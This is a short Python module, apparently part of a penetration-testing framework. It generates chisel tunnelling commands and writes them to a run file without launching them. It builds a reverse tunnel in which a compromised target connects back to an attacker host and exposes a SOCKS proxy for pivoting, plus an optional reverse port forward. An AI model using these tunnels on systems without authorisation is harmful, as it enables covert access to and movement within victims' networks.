"""Generate chisel server/client tunnel commands for manual launch.

Splits the previously conflated ports: ``server_port`` is the port the chisel
server listens on and ``socks_port`` is the SOCKS port exposed by the reverse
tunnel client. Commands are written to a run-scoped file; nothing is launched.
"""

import os


def _run_dir(ctx) -> str:
    run_dir = os.environ.get("OFX_RUN_DIR") or str(ctx.env.get("OFX_RUN_DIR") or "")
    if not run_dir:
        raise RuntimeError("OFX_RUN_DIR is not set; cannot write the tunnel commands")
    return run_dir


def run(ctx):
    lhost = str(ctx.inputs.get("lhost") or "").strip()
    if not lhost:
        raise ValueError("'lhost' (attacker host running the chisel server) is required")

    server_port = str(ctx.inputs.get("server_port") or "").strip()
    if not server_port:
        raise ValueError("'server_port' (chisel server listen port) is required")
    socks_port = str(ctx.inputs.get("socks_port") or "").strip()
    if not socks_port:
        raise ValueError("'socks_port' (SOCKS port exposed on the target) is required")

    target_host = str(ctx.inputs.get("target_host") or "").strip()
    target_port = str(ctx.inputs.get("target_port") or "").strip()

    lines = [
        "# chisel tunneling — MANUAL LAUNCH REQUIRED",
        "",
        "# 1. Attacker (server, listens for reverse tunnels):",
        f"chisel server -p {server_port} --reverse",
        "",
        "# 2. Target (client, exposes a SOCKS proxy back to the attacker):",
        f"chisel client {lhost}:{server_port} R:{socks_port}:socks",
        "",
        f"# 3. Use the proxy: proxychains (socks5 127.0.0.1 {socks_port})",
    ]

    if target_host and target_port:
        lines += [
            "",
            "# Optional — reverse port forward:",
            f"chisel client {lhost}:{server_port} R:{target_port}:{target_host}:{target_port}",
        ]

    run_dir = _run_dir(ctx)
    out = os.path.join(run_dir, "chisel_commands.txt")
    with open(out, "w", encoding="utf-8") as handle:
        handle.write("\n".join(lines) + "\n")

    for line in lines:
        print(line)
    print(f"[+] Commands written to {out}")

    ctx.add_outputs(
        method="chisel",
        command_file=out,
        server_host=lhost,
        server_port=server_port,
        socks_port=socks_port,
        target_host=target_host,
        target_port=target_port,
    )
